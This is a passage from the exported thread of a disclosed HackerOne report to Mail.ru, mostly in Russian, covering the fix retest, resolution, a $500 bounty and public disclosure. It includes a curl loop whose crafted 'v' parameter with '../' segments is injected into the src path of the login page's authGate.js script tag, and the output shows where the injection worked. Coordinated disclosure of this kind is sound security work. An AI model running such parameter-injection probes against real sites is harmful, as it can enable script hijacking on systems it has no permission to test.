src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 36 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 37 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\n```\n\n```\nmihailob@kali:~$ for i in `seq 1 50`; do echo \"Try $i - `curl -is \"https://account.mail.ru/login?v=1.3.14633asd\u0026v=1.2.544/lalala/../../../../?$i\" | grep -oh '\u003cscript\\ssrc=.*authGate.js'`\"; done;\nTry 1 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?10/authGate.js\nTry 11 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 17 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 22 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?35/authGate.js\nTry 36 - \u003cscript src=\"https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?36/authGate.js\nTry 37 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u003cscript src=\"//img.imgsmail.ru/ag/0.3.13/authGate.js\n```","markdown_message":"\u003cp\u003eОго, оперативно, спасибо! Валидацию потестил, не знаю как у mail.ru синкается код между серверами, но сейчас фикс выглядит неполным.\u003c/p\u003e\n\n\u003cp\u003eЗапускал из разных стран, иногда таки отстреливает без валидации:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eubuntu@ip-172-31-36-215:~/www/php/pocs/tmp$ for i in `seq 1 50`; do echo \u0026quot;Try $i - `curl -is \u0026quot;https://account.mail.ru/login?v=1.3.14633asd\u0026amp;v=1.2.544/lalala/../../../../?$i\u0026quot; | grep -oh \u0026#39;\u0026lt;script\\ssrc=.*authGate.js\u0026#39;`\u0026quot;; done;                                                                                                                                                                                                         \nTry 1 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 11 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u0026lt;script src=\u0026quot;https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?16/authGate.js\nTry 17 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u0026lt;script src=\u0026quot;https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?21/authGate.js\nTry 22 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 36 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 37 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emihailob@kali:~$ for i in `seq 1 50`; do echo \u0026quot;Try $i - `curl -is \u0026quot;https://account.mail.ru/login?v=1.3.14633asd\u0026amp;v=1.2.544/lalala/../../../../?$i\u0026quot; | grep -oh \u0026#39;\u0026lt;script\\ssrc=.*authGate.js\u0026#39;`\u0026quot;; done;\nTry 1 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 2 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 3 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 4 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 5 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 6 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 7 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 8 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 9 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 10 - \u0026lt;script src=\u0026quot;https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?10/authGate.js\nTry 11 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 12 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 13 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 14 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 15 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 16 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 17 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 18 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 19 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 20 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 21 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 22 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 23 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 24 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 25 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 26 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 27 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 28 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 29 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 30 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 31 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 32 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 33 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 34 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 35 - \u0026lt;script src=\u0026quot;https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?35/authGate.js\nTry 36 - \u0026lt;script src=\u0026quot;https://img.imgsmail.ru/ag/1.2.544/lalala/../../../../?36/authGate.js\nTry 37 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 38 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 39 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 40 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 41 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 42 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 43 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 44 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 45 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 46 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 47 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 48 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 49 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\nTry 50 - \u0026lt;script src=\u0026quot;//img.imgsmail.ru/ag/0.3.13/authGate.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-11-19T00:02:09.911Z","updated_at":"2017-11-19T00:02:09.911Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2168366,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Только сегодня заметил что вывод dig и host в дескрипшне репорта неверный (там выводится 94.100.180.102) . Видимо я скопировал вывод до рестарта dnsmasq'а. Там в выводе на самом деле 178.237.20.77. Надеюсь никого не ввёл в заблуждение.","markdown_message":"\u003cp\u003eТолько сегодня заметил что вывод dig и host в дескрипшне репорта неверный (там выводится 94.100.180.102) . Видимо я скопировал вывод до рестарта dnsmasq\u0026#39;а. Там в выводе на самом деле 178.237.20.77. Надеюсь никого не ввёл в заблуждение.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-19T10:44:19.892Z","updated_at":"2017-11-19T10:44:19.892Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2168590,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет.\nПро \"неполный фикс\" сообщил разразработчикам. Спасибо за находку.\nПо поводу \"dig и host в дескрипшне репорта\" не переживай, мы поняли что ты имел ввиду, иначе бы попросили уточнений. ","markdown_message":"\u003cp\u003eПривет.\u003cbr\u003e\nПро \u0026quot;неполный фикс\u0026quot; сообщил разразработчикам. Спасибо за находку.\u003cbr\u003e\nПо поводу \u0026quot;dig и host в дескрипшне репорта\u0026quot; не переживай, мы поняли что ты имел ввиду, иначе бы попросили уточнений. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-19T14:50:14.956Z","updated_at":"2017-11-19T14:50:14.956Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2172575,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Привет, бага закрыта.\nПожалуйста, подтвердите, что проблема больше не воспроизводится. \n","markdown_message":"\u003cp\u003eПривет, бага закрыта.\u003cbr\u003e\nПожалуйста, подтвердите, что проблема больше не воспроизводится. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-21T11:00:12.636Z","updated_at":"2017-11-21T11:00:12.636Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"obmi","url":"/obmi"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2172599,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет, да, подтверждаю, не воспроизводится","markdown_message":"\u003cp\u003eПривет, да, подтверждаю, не воспроизводится\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-21T11:20:08.183Z","updated_at":"2017-11-21T11:20:08.183Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176095,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Привет, не хочу показаться наглым, но попадает ли данный отчет под баунти?)","markdown_message":"\u003cp\u003eПривет, не хочу показаться наглым, но попадает ли данный отчет под баунти?)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T07:47:56.755Z","updated_at":"2017-11-22T07:47:56.755Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176191,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Да, account.mail.ru попадает в скоп программы, решение по размерам выплаты обычно принимается в течение двух недель после репорта.","markdown_message":"\u003cp\u003eДа, account.mail.ru попадает в скоп программы, решение по размерам выплаты обычно принимается в течение двух недель после репорта.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T09:09:17.890Z","updated_at":"2017-11-22T09:09:17.890Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2176749,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Привет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице https://hackerone.com/settings/bounties можно выбрать желаемый метод выплаты. \n\nСпасибо и ждем от тебя новых багрепортов!\n\nP.S. работа по устранению уязвимости пока продолжается.","markdown_message":"\u003cp\u003eПривет, вознаграждение за найденную уязвимость начислено на твой аккаунт. На странице \u003ca title=\"https://hackerone.com/settings/bounties\" href=\"https://hackerone.com/settings/bounties\"\u003ehttps://hackerone.com/settings/bounties\u003c/a\u003e можно выбрать желаемый метод выплаты. \u003c/p\u003e\n\n\u003cp\u003eСпасибо и ждем от тебя новых багрепортов!\u003c/p\u003e\n\n\u003cp\u003eP.S. работа по устранению уязвимости пока продолжается.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T15:14:43.850Z","updated_at":"2017-11-22T15:14:43.850Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mail.ru"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"mailru","collaborator":{"username":"obmi","url":"/obmi"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2176894,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Спасибо! Немного не понял про работу, которая продолжается. Уже вроде зарезолвили и пофиксили :)","markdown_message":"\u003cp\u003eСпасибо! Немного не понял про работу, которая продолжается. Уже вроде зарезолвили и пофиксили :)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T16:01:24.779Z","updated_at":"2017-11-22T16:01:24.779Z","actor":{"username":"obmi","cleared":false,"url":"/obmi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/212/50877789876ed8c80a2a19ccbd1a0da6b7dd0f07_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2176908,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Упс... Небольшая ошибочка. Всё зафикшено. Всё хорошо )","markdown_message":"\u003cp\u003eУпс... Небольшая ошибочка. Всё зафикшено. Всё хорошо )\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-22T16:07:45.720Z","updated_at":"2017-11-22T16:07:45.720Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2247011,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-26T16:03:52.068Z","updated_at":"2018-02-28T13:11:30.224Z","additional_data":{"added_weaknesses":[{"id":30,"name":"Man-in-the-Middle"}],"removed_weaknesses":[{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"}]},"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2248398,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-12-27T14:11:31.894Z","updated_at":"2017-12-27T14:11:31.894Z","first_to_agree":true,"actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2320809,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-26T14:11:48.772Z","updated_at":"2018-01-26T14:11:48.772Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":6165,"category":"team","content":"D